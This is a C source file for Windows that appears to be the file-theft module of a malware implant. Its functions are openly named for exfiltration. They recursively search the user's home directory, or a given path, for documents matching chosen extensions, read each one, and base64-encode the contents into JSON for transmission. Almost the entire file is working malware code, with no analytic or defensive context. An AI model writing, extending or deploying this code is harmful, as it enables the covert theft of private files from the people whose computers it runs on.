#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#include "dynamic_linking.h"

#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wformat-truncation"

// Forward declaration
unsigned char* base64_decode(const char* encoded, size_t* output_len);

// Function to read a file and return base64-encoded content
// Returns JSON string with filename and content, or error message
// Format: {"filename":"path","size":1234,"content":"base64data"}
char* exfiltrate_file(const char* filepath) {
    FILE *file = NULL;
    unsigned char *buffer = NULL;
    char *base64_data = NULL;
    char *result = NULL;
    long file_size = 0;
    size_t bytes_read = 0;
    
    if (!filepath || strlen(filepath) == 0) {
        const char *error = "{\"error\":\"No filepath provided\"}";
        return base64_encode((unsigned char*)error, strlen(error));
    }
    
    // Open file in binary mode
    file = fopen(filepath, "rb");
    if (!file) {
        char error_msg[512];
        snprintf(error_msg, sizeof(error_msg), 
                "{\"error\":\"Failed to open file\",\"filepath\":\"%s\"}", filepath);
        return base64_encode((unsigned char*)error_msg, strlen(error_msg));
    }
    
    // Get file size
    fseek(file, 0, SEEK_END);
    file_size = ftell(file);
    fseek(file, 0, SEEK_SET);
    
    // Check for reasonable file size (max 50MB to avoid memory issues)
    if (file_size <= 0 || file_size > 52428800) {
        fclose(file);
        char error_msg[512];
        snprintf(error_msg, sizeof(error_msg), 
                "{\"error\":\"File size invalid or too large\",\"filepath\":\"%s\",\"size\":%ld}", 
                filepath, file_size);
        return base64_encode((unsigned char*)error_msg, strlen(error_msg));
    }
    
    // Allocate buffer for file content
    buffer = (unsigned char*)malloc(file_size);
    if (!buffer) {
        fclose(file);
        const char *error = "{\"error\":\"Memory allocation failed\"}";
        return base64_encode((unsigned char*)error, strlen(error));
    }
    
    // Read file content
    bytes_read = fread(buffer, 1, file_size, file);
    fclose(file);
    
    if (bytes_read != (size_t)file_size) {
        free(buffer);
        char error_msg[512];
        snprintf(error_msg, sizeof(error_msg), 
                "{\"error\":\"Failed to read complete file\",\"filepath\":\"%s\"}", filepath);
        return base64_encode((unsigned char*)error_msg, strlen(error_msg));
    }
    
    // Base64 encode the file content
    base64_data = base64_encode(buffer, file_size);
    free(buffer);
    
    if (!base64_data) {
        const char *error = "{\"error\":\"Base64 encoding failed\"}";
        return base64_encode((unsigned char*)error, strlen(error));
    }
    
    // Extract just the filename from the full path
    const char *filename = strrchr(filepath, '\\');
    if (filename) {
        filename++; // Skip the backslash
    } else {
        filename = strrchr(filepath, '/');
        if (filename) {
            filename++; // Skip the forward slash
        } else {
            filename = filepath; // No path separator found, use entire string
        }
    }
    
    // Build JSON response with filename and base64 content
    // Format: {"filename":"file.txt","size":1234,"content":"base64data"}
    size_t result_size = strlen(filename) + strlen(base64_data) + 256;
    result = (char*)malloc(result_size);
    
    if (!result) {
        free(base64_data);
        const char *error = "{\"error\":\"Memory allocation failed for result\"}";
        return base64_encode((unsigned char*)error, strlen(error));
    }
    
    snprintf(result, result_size, 
            "{\"filename\":\"%s\",\"size\":%ld,\"content\":\"%s\"}",
            filename, file_size, base64_data);
    
    free(base64_data);
    
    // Base64 encode the entire JSON result for transmission
    char *encoded_result = base64_encode((unsigned char*)result, strlen(result));
    free(result);
    
    return encoded_result;
}

// Helper function to check if a file has a specific extension
BOOL has_extension(const char* filename, const char* ext) {
    if (!filename || !ext) return FALSE;
    
    size_t filename_len = strlen(filename);
    size_t ext_len = strlen(ext);
    
    if (filename_len < ext_len) return FALSE;
    
    // Case-insensitive comparison
    return _stricmp(filename + filename_len - ext_len, ext) == 0;
}

// Helper function to check if file matches any extension in comma-separated list
BOOL matches_any_extension(const char* filename, const char* extensions) {
    if (!filename || !extensions) return FALSE;
    
    char ext_copy[512];
    strncpy(ext_copy, extensions, sizeof(ext_copy) - 1);
    ext_copy[sizeof(ext_copy) - 1] = '\0';
    
    char* token = strtok(ext_copy, ",");
    while (token) {
        // Trim whitespace
        while (*token == ' ') token++;
        if (strlen(token) > 0) {
            if (has_extension(filename, token)) {
                return TRUE;
            }
        }
        token = strtok(NULL, ",");
    }
    
    return FALSE;
}

// Recursive function to scan directory and exfiltrate files by extension
// Returns JSON array of exfiltrated files (base64-encoded)
char* exfiltrate_directory_by_extension_internal(const char* directory, const char* extensions, int* file_count, int depth, int max_depth) {
    WIN32_FIND_DATAA find_data;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    char search_path[MAX_PATH];
    char full_path[MAX_PATH];
    char* result = NULL;
    size_t result_size = 8192;  // Start with 8KB
    size_t result_len = 0;
    int count = 0;
    
    if (!directory || !extensions || !file_count) {
        const char *error = "{\"error\":\"Invalid parameters for directory scan\"}";
        return base64_encode((unsigned char*)error, strlen(error));
    }
    
    *file_count = 0;
    
    // Allocate result buffer
    result = (char*)malloc(result_size);
    if (!result) {
        const char *error = "{\"error\":\"Memory allocation failed\"}";
        return base64_encode((unsigned char*)error, strlen(error));
    }
    
    // Start JSON array
    strcpy(result, "[");
    result_len = 1;
    
    // Build search path: directory\*
    snprintf(search_path, sizeof(search_path), "%s\\*", directory);
    
    // Start finding files
    hFind = FindFirstFileA(search_path, &find_data);
    
    if (hFind == INVALID_HANDLE_VALUE) {
        free(result);
        char error_msg[512];
        snprintf(error_msg, sizeof(error_msg), 
                "{\"error\":\"Failed to open directory\",\"path\":\"%s\"}", directory);
        return base64_encode((unsigned char*)error_msg, strlen(error_msg));
    }
    
    do {
        // Skip . and ..
        if (strcmp(find_data.cFileName, ".") == 0 || strcmp(find_data.cFileName, "..") == 0) {
            continue;
        }
        
        // Skip hidden and system files/directories to avoid access issues
        if (find_data.dwFileAttributes & (FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)) {
            continue;
        }
        
        // Skip reparse points (junctions, symlinks) to prevent infinite loops
        if (find_data.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) {
            continue;
        }
        
        // Build full path
        snprintf(full_path, sizeof(full_path), "%s\\%s", directory, find_data.cFileName);
        
        // Check if it's a directory
        if (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            // Recursive directory scan
            int subdir_count = 0;
                char* subdir_result = exfiltrate_directory_by_extension_internal(full_path, extensions, &subdir_count, depth + 1, max_depth);
                
                if (subdir_result && subdir_count > 0) {
                    // Parse and merge results (skip the outer [ and ])
                    char* content_start = strchr(subdir_result, '[');
                    if (content_start) {
                        content_start++;  // Skip [
                        char* content_end = strrchr(subdir_result, ']');
                        if (content_end && content_end > content_start) {
                            size_t content_len = content_end - content_start;
                            
                            // Ensure we have enough space
                            while (result_len + content_len + 10 > result_size) {
                                result_size *= 2;
                                char* new_result = (char*)realloc(result, result_size);
                                if (!new_result) {
                                    free(result);
                                    free(subdir_result);
                                    FindClose(hFind);
                                    const char *error = "{\"error\":\"Memory reallocation failed\"}";
                                    return base64_encode((unsigned char*)error, strlen(error));
                                }
                                result = new_result;
                            }
                            
                            // Add comma if not first item
                            if (count > 0) {
                                result[result_len++] = ',';
                            }
                            
                            // Add subdirectory results
                            memcpy(result + result_len, content_start, content_len);
                            result_len += content_len;
                            count += subdir_count;
                        }
                    }
                    free(subdir_result);
                }
        } else {
            // Check if file matches extension filter
            if (matches_any_extension(find_data.cFileName, extensions)) {
                // Exfiltrate this file
                char* file_data = exfiltrate_file(full_path);
                
                if (file_data) {
                    // Decode to get the actual JSON
                    size_t decoded_len = 0;
                    unsigned char* decoded = base64_decode(file_data, &decoded_len);
                    
                    if (decoded && decoded_len > 0) {
                        // Ensure we have enough space
                        while (result_len + decoded_len + 10 > result_size) {
                            result_size *= 2;
                            char* new_result = (char*)realloc(result, result_size);
                            if (!new_result) {
                                free(result);
                                free(file_data);
                                free(decoded);
                                FindClose(hFind);
                                const char *error = "{\"error\":\"Memory reallocation failed\"}";
                                return base64_encode((unsigned char*)error, strlen(error));
                            }
                            result = new_result;
                        }
                        
                        // Add comma if not first item
                        if (count > 0) {
                            result[result_len++] = ',';
                        }
                        
                        // Add file data
                        memcpy(result + result_len, decoded, decoded_len);
                        result_len += decoded_len;
                        count++;
                        
                        free(decoded);
                    }
                    
                    free(file_data);
                }
            }
        }
        
    } while (FindNextFileA(hFind, &find_data) != 0);
    
    FindClose(hFind);
    
    // Close JSON array
    result[result_len++] = ']';
    result[result_len] = '\0';
    
    *file_count = count;
    
    // Base64 encode the entire JSON array
    char* encoded_result = base64_encode((unsigned char*)result, result_len);
    free(result);
    
    return encoded_result;
}

// Wrapper function with default depth limit
char* exfiltrate_directory_by_extension(const char* directory, const char* extensions, int* file_count) {
    const int max_depth = 10;  // Maximum recursion depth (10 levels deep)
    return exfiltrate_directory_by_extension_internal(directory, extensions, file_count, 0, max_depth);
}

// Helper function to get current user's home directory
char* get_user_home_directory() {
    static char home_dir[MAX_PATH];
    DWORD size = MAX_PATH;
    
    // Try USERPROFILE environment variable first
    if (GetEnvironmentVariableA("USERPROFILE", home_dir, size) > 0) {
        return home_dir;
    }
    
    // Fallback: combine HOMEDRIVE and HOMEPATH
    char home_drive[10];
    char home_path[MAX_PATH];
    
    if (GetEnvironmentVariableA("HOMEDRIVE", home_drive, sizeof(home_drive)) > 0 &&
        GetEnvironmentVariableA("HOMEPATH", home_path, sizeof(home_path)) > 0) {
        snprintf(home_dir, sizeof(home_dir), "%s%s", home_drive, home_path);
        return home_dir;
    }
    
    // Last resort: C:\Users\<username>
    char username[257];
    DWORD username_size = sizeof(username);
    if (GetUserNameA(username, &username_size)) {
        snprintf(home_dir, sizeof(home_dir), "C:\\Users\\%s", username);
        return home_dir;
    }
    
    return NULL;
}

// Main function to exfiltrate files from user directory by extension
// Args format: "extensions" (e.g., ".pdf,.docx,.txt") or "path|extensions"
char* exfiltrate_user_files_by_extension(const char* args) {
    char* directory = NULL;
    char extensions[512];
    int file_count = 0;
    
    if (!args || strlen(args) == 0) {
        const char *error = "{\"error\":\"No extension filter provided\"}";
        return base64_encode((unsigned char*)error, strlen(error));
    }
    
    // Parse args: check if it contains | separator
    const char* separator = strchr(args, '|');
    
    if (separator) {
        // Format: "path|extensions"
        size_t path_len = separator - args;
        if (path_len >= MAX_PATH) {
            const char *error = "{\"error\":\"Path too long\"}";
            return base64_encode((unsigned char*)error, strlen(error));
        }
        
        static char custom_path[MAX_PATH];
        strncpy(custom_path, args, path_len);
        custom_path[path_len] = '\0';
        directory = custom_path;
        
        // Copy extensions (skip the separator)
        strncpy(extensions, separator + 1, sizeof(extensions) - 1);
        extensions[sizeof(extensions) - 1] = '\0';
    } else {
        // Format: just "extensions" - use user home directory
        directory = get_user_home_directory();
        if (!directory) {
            const char *error = "{\"error\":\"Failed to determine user home directory\"}";
            return base64_encode((unsigned char*)error, strlen(error));
        }
        
        strncpy(extensions, args, sizeof(extensions) - 1);
        extensions[sizeof(extensions) - 1] = '\0';
    }
    
    // Perform the directory scan and exfiltration
    return exfiltrate_directory_by_extension(directory, extensions, &file_count);
}

// Need to add base64_decode function for parsing results
unsigned char* base64_decode(const char* encoded, size_t* output_len) {
    if (!encoded || !output_len) return NULL;
    
    size_t encoded_len = strlen(encoded);
    if (encoded_len == 0) return NULL;
    
    // Calculate output length
    size_t padding = 0;
    if (encoded[encoded_len - 1] == '=') padding++;
    if (encoded_len > 1 && encoded[encoded_len - 2] == '=') padding++;
    
    *output_len = (encoded_len * 3) / 4 - padding;
    
    unsigned char* decoded = (unsigned char*)malloc(*output_len + 1);
    if (!decoded) return NULL;
    
    // Base64 decoding table
    static const unsigned char decode_table[256] = {
        ['A'] = 0, ['B'] = 1, ['C'] = 2, ['D'] = 3, ['E'] = 4, ['F'] = 5, ['G'] = 6, ['H'] = 7,
        ['I'] = 8, ['J'] = 9, ['K'] = 10, ['L'] = 11, ['M'] = 12, ['N'] = 13, ['O'] = 14, ['P'] = 15,
        ['Q'] = 16, ['R'] = 17, ['S'] = 18, ['T'] = 19, ['U'] = 20, ['V'] = 21, ['W'] = 22, ['X'] = 23,
        ['Y'] = 24, ['Z'] = 25, ['a'] = 26, ['b'] = 27, ['c'] = 28, ['d'] = 29, ['e'] = 30, ['f'] = 31,
        ['g'] = 32, ['h'] = 33, ['i'] = 34, ['j'] = 35, ['k'] = 36, ['l'] = 37, ['m'] = 38, ['n'] = 39,
        ['o'] = 40, ['p'] = 41, ['q'] = 42, ['r'] = 43, ['s'] = 44, ['t'] = 45, ['u'] = 46, ['v'] = 47,
        ['w'] = 48, ['x'] = 49, ['y'] = 50, ['z'] = 51, ['0'] = 52, ['1'] = 53, ['2'] = 54, ['3'] = 55,
        ['4'] = 56, ['5'] = 57, ['6'] = 58, ['7'] = 59, ['8'] = 60, ['9'] = 61, ['+'] = 62, ['/'] = 63,
    };
    
    size_t i = 0, j = 0;
    unsigned char block[4];
    
    for (i = 0; i < encoded_len;) {
        for (int k = 0; k < 4 && i < encoded_len; k++, i++) {
            if (encoded[i] == '=') {
                block[k] = 0;
            } else {
                block[k] = decode_table[(unsigned char)encoded[i]];
            }
        }
        
        if (j < *output_len) decoded[j++] = (block[0] << 2) | (block[1] >> 4);
        if (j < *output_len) decoded[j++] = (block[1] << 4) | (block[2] >> 2);
        if (j < *output_len) decoded[j++] = (block[2] << 6) | block[3];
    }
    
    decoded[*output_len] = '\0';
    
#pragma GCC diagnostic pop
    return decoded;
}
